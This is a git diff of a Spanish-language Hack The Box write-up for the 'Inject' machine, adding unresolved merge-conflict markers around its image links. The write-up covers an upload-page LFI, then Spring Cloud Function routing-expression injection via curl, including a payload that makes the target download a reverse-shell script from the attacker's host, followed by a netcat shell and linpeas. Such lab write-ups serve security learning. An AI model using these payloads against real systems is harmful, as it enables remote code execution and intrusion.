@@ -4,7 +4,11 @@ author: 4akatun
 ---
 
 # Writeup
+<<<<<<< HEAD
 ![Inject]({{'assets/img/Inject/inject.png' | relative_url}}) 
+=======
+![Inject](assets/img/Inject/inject.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 HACK-THE-BOX
 
@@ -32,6 +36,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 Analizo la pagina web, dado que no hay mucho mas.
 
+<<<<<<< HEAD
 ![web-Inject]({{'/assets/img/Inject/web_inject.png' | relative_url}})
 
 Veo esto, curioseando lo unico interesante en el apartado **upload**
@@ -51,11 +56,36 @@ Bien, se ha subido correctamente y paso por **BurpSuite** la *url* de la imagen.
 Lo que funciona en este caso es **LFI** -> *Local File Inclusion*.
 Apuntamos al **/etc/hosts** para validar que funciona nuestro *LFI*
 ![LFI]({{'/assets/img/Inject/LFI_inject.png' | relative_url}})
+=======
+![web-Inject](/assets/img/Inject/web_inject.png)
+
+Veo esto, curioseando lo unico interesante en el apartado **upload**
+![upload](/assets/img/Inject/upload_inject.png)
+
+Solo admite archivos de imagen
+
+![upload-result](/assets/img/Inject/img_upload.png)
+
+Provare con cualquier imagen 
+
+![upload-succes](/assets/img/Inject/succesful_img.png)
+
+Bien, se ha subido correctamente y paso por **BurpSuite** la *url* de la imagen. Se ve lo siguiente...
+![img-url](/assets/img/Inject/burp_inject.png)
+
+Lo que funciona en este caso es **LFI** -> *Local File Inclusion*.
+Apuntamos al **/etc/hosts** para validar que funciona nuestro *LFI*
+![LFI](/assets/img/Inject/LFI_inject.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 Buscando algo de lo que aprovecharme, encuentro en la ruta **/var/www/WebApp** un 
 archivo con nombre ***pom.xml***
 
+<<<<<<< HEAD
 ![xml-file]({{'/assets/img/Inject/xml.png' | relative_url}})
+=======
+![xml-file](/assets/img/Inject/xml.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 Lo examino y encuentro algo y busco informacion para ver si me puedo aprovechar para poder subir 
 archivos a la maquina victima. Dejo enlaces con la informacion ->
@@ -68,7 +98,11 @@ Probamos los comandos para subir un archivo *test* y ver que funcione.
 ❯ curl -X POST -H 'Host: 10.10.11.204:8080' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary 'exploit_poc' 'http://10.10.11.204:8080/functionRouter'
 ```
 
+<<<<<<< HEAD
 ![test-file]({{'/assets/img/Inject/test_file_inject.png' | relative_url}})
+=======
+![test-file](/assets/img/Inject/test_file_inject.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 Y lo tenemos, archivo subido, ahroa subimos nuestro archivo malicioso con un comando de **revers shell**
 
@@ -81,7 +115,11 @@ Lo volvemo a subir con el comando anterior.
 ❯ curl -X POST -H 'Host: 10.10.11.204:8080' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.15/rever.sh -o /tmp/rever.sh")' --data-binary 'exploit_poc' 'http://10.10.11.204:8080/functionRouter'
 ```
 
+<<<<<<< HEAD
 ![revers-file]({{'/assets/img/Inject/rever_inject.png' | relative_url}})
+=======
+![revers-file](/assets/img/Inject/rever_inject.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 Ya esta, lo queda mandar otra orden para ejectar el archivo y estando en escucha en nuestro equipo con **netcat** obtenemos una **shell**
 
@@ -136,7 +174,11 @@ bash-5.0$
 Pareceser que es valida y podemos visualizar la flag, hora de continuar con la escalada.
 Subimos el binario **linpeas** para analizar y buscar formas factibles de escalada de privilegios.
 
+<<<<<<< HEAD
 ![linpeas]({{'/assets/img/Inject/linpeas.png' | relative_url}})
+=======
+![linpeas](/assets/img/Inject/linpeas.png)
+>>>>>>> 1a6d6523c15b55acd62e0834c27ded771cbc59f7
 
 Veo este archivo en la ruta **/opt** el cual puede ser modificado, busco mas informacion para
 ver de que se trata. Dejo lo enlaces ->
